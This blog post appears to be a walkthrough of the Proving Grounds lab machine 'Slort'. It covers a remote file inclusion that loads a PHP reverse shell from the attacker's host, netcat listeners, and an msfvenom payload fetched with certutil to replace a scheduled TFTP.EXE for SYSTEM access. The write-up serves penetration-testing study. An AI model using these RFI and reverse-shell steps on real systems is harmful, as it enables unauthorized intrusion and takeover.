---
layout: post
title: PG | Slort
subtitle: For this machine, enumeration is key.
---

# Nmap Scan Results

~~~shell
Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-29 07:45 UTC
Nmap scan report for 192.168.182.53
Host is up (0.015s latency).
Not shown: 65520 closed tcp ports (reset)
PORT      STATE SERVICE       VERSION
21/tcp    open  ftp           FileZilla ftpd 0.9.41 beta
| ftp-syst: 
|_  SYST: UNIX emulated by FileZilla
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
3306/tcp  open  mysql?
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, FourOhFourRequest, HTTPOptions, NULL, SIPOptions, SMBProgNeg, TLSSessionReq, TerminalServerCookie, WMSRequest, ms-sql-s, oracle-tns: 
|_    Host '192.168.45.185' is not allowed to connect to this MariaDB server
4443/tcp  open  http          Apache httpd 2.4.43 ((Win64) OpenSSL/1.1.1g PHP/7.4.6)
| http-title: Welcome to XAMPP
|_Requested resource was http://192.168.182.53:4443/dashboard/
|_http-server-header: Apache/2.4.43 (Win64) OpenSSL/1.1.1g PHP/7.4.6
5040/tcp  open  unknown
7680/tcp  open  pando-pub?
8080/tcp  open  http          Apache httpd 2.4.43 ((Win64) OpenSSL/1.1.1g PHP/7.4.6)
|_http-server-header: Apache/2.4.43 (Win64) OpenSSL/1.1.1g PHP/7.4.6
| http-title: Welcome to XAMPP
|_Requested resource was http://192.168.182.53:8080/dashboard/
|_http-open-proxy: Proxy might be redirecting requests
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2023-10-29T07:48:07
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 189.12 seconds
~~~

## FTP (TCP/21)

I begun enumeration by attempting an anonymous connection to FTP which failed
~~~shell
┌──(kali㉿kali)-[~/Desktop/Slort]
└─$ ftp anonymous@192.168.182.53 
Connected to 192.168.182.53.
220-FileZilla Server version 0.9.41 beta
220-written by Tim Kosse (Tim.Kosse@gmx.de)
220 Please visit http://sourceforge.net/projects/filezilla/
331 Password required for anonymous
Password: 
530 Login or password incorrect!
ftp: Login failed
~~~

## SMB (TCP/139, 445)

I attempted a NULL SMB session which also failed
~~~shell
┌──(kali㉿kali)-[~/Desktop/Slort]
└─$ smbclient -N -L //192.168.182.53
session setup failed: NT_STATUS_ACCESS_DENIED
~~~

## MySQL (TCP/3306)

In the nmap scan it states our IP is unable to connect to the MariaDB server on the target, this is most likely because the server is hosted locally on port 127.0.0.1 and inaccessible over the internet

Oracle-TNS uses encryption and TLS to protect database communication over a network
~~~shell
3306/tcp  open  mysql?
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, FourOhFourRequest, HTTPOptions, NULL, SIPOptions, SMBProgNeg, TLSSessionReq, TerminalServerCookie, WMSRequest, ms-sql-s, oracle-tns: 
|_    Host '192.168.45.185' is not allowed to connect to this MariaDB server
~~~
## HTTP (TCP/4443)

I first ran a feroxbuster subdirectory scan and found 3 sub-directories: site, dashboard and img
~~~shell
┌──(kali㉿kali)-[~/Desktop/Slort]
└─$ feroxbuster -u http://192.168.182.53:4443 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -o SlortDirs
~~~
~~~shell
┌──(kali㉿kali)-[~/Desktop/Slort]
└─$ cat SlortDirs         
301      GET        9l       30w      346c http://192.168.182.53:4443/site => http://192.168.182.53:4443/site/
302      GET        0l        0w        0c http://192.168.182.53:4443/ => http://192.168.182.53:4443/dashboard/
301      GET        9l       30w      345c http://192.168.182.53:4443/img => http://192.168.182.53:4443/img/
~~~
After browsing to http://192.168.182.53:4443/site I immediately noticed the URL could potentially contain a File Inclusion vulnerability

![Slort](/assets/img/SlortPG(1).png)

I started by testing for Local File Inclusion by attempting to pull files from the target machine and display them on the website using common Windows file paths from [here](https://gist.github.com/korrosivesec/a339e376bae22fcfb7f858426094661e) which succeeded!

![Slort](/assets/img/SlortPG(2).png)

I then tested if a Rmote File Inclusion (RFI) exists by starting a HTTP server on my attack machine then sending a HTTP GET request through the targets URL 'page' parameter
~~~shell
┌──(kali㉿kali)-[~/Desktop/Slort]
└─$ python3 -m http.server 80                                                            
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
~~~

![Slort](/assets/img/SlortPG(3).png)

~~~shell
┌──(kali㉿kali)-[~/Desktop/Slort]
└─$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
192.168.182.53 - - [29/Oct/2023 08:34:28] "GET /test HTTP/1.0" 200 -
~~~
The RFI worked! We can therefore try to transfer a shell and get our initial foothold

# Exploit

I downloaded [this](https://github.com/Dhayalanb/windows-php-reverse-shell/blob/master/Reverse%20Shell.php) PHP Reverse shell and changed the IP, Port and directory parameters

![Slort](/assets/img/SlortPG(4).png)

![Slort](/assets/img/SlortPG(5).png)

I then downloaded the reverse shell to the host using the RFI
~~~shell
http://192.168.182.53:4443/site/index.php?page=http://192.168.45.185/shell.php
~~~
I started a listener on port 21 to avoid firewall restrictions
~~~shell
┌──(kali㉿kali)-[~/Desktop/Slort]
└─$ nc -nvlp 21
listening on [any] 21 ...
~~~
I then ran the reverse shell payload

http://192.168.182.53:4443/site/index.php?page=shell.php

And I recieved my initial foothold!
~~~shell
┌──(kali㉿kali)-[~/Desktop/Slort]
└─$ nc -nvlp 21
listening on [any] 21 ...
connect to [192.168.45.185] from (UNKNOWN) [192.168.182.53] 50814
b374k shell : connected

Microsoft Windows [Version 10.0.19042.1387]
(c) Microsoft Corporation. All rights reserved.

C:\xampp\htdocs\site>
~~~
# Privilege Escalation

I started enumeration for Privilege Escalation by running a winpeas scan and found an executable file 'TFTP.EXE' we have write permissions over

![Slort](/assets/img/SlortPG(6).png)

After navigating to the directory containing the executable, I found an info.txt file that states the file is run every 5 minutes, the Backup directory name indicates that it is most likely ran with SYSTEM (root) permissions

I created a reverse shell .exe using MSFVenom and named it 'TFTP.EXE'
~~~shell
┌──(kali㉿kali)-[~/Desktop/Slort]
└─$ msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.185 LPORT=445 -f exe > TFTP.EXE 
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 324 bytes
Final size of exe file: 73802 bytes
~~~
I started my netcat listener on port 445
~~~shell
┌──(kali㉿kali)-[~/Desktop/Slort]
└─$ nc -nvlp 445 
listening on [any] 445 ...
~~~
I then replaced the current TFTP.EXE file with my reverse shell TFTP.EXE
~~~shell
C:\Backup>move TFTP.EXE BACKUPTFTP.EXE
move TFTP.EXE BACKUPTFTP.EXE
        1 file(s) moved.

C:\Backup>certutil.exe -f -urlcache -split http://192.168.45.185/TFTP.EXE
certutil.exe -f -urlcache -split http://192.168.45.185/TFTP.EXE
****  Online  ****
  000000  ...
  01204a
CertUtil: -URLCache command completed successfully.
~~~
After a while I recieved a SYSTEM (root) shell on my listener!
~~~shell
┌──(kali㉿kali)-[~/Desktop/Slort]
└─$ nc -nvlp 445 
listening on [any] 445 ...
connect to [192.168.45.185] from (UNKNOWN) [192.168.182.53] 50861
Microsoft Windows [Version 10.0.19042.1387]
(c) Microsoft Corporation. All rights reserved.

C:\WINDOWS\system32>whoami
whoami
slort\administrator
~~~